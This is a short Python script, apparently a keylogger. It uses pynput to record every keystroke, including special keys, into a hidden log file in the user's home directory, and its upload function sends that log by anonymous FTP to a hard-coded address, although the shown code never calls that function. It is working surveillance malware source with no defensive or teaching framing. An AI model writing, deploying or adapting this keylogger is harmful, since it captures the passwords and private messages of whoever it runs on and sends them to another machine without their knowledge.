from pynput.keyboard import Key, Listener
import logging
import os
from ftplib import FTP

log_directory = os.path.expanduser("~") + "/logs/"

if not os.path.exists(log_directory):
    os.makedirs(log_directory)  # Properly indented by 4 spaces


log_file = log_directory + "keylog.txt"

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def upload_log():
    ftp = FTP("192.168.1.100")
    ftp.login("anonymous", "")
    with open(log_file, "rb") as file:
        ftp.storbinary("STOR keylog.txt", file)
    ftp.quit()

with Listener(on_press=on_press) as listener:
    listener.join()

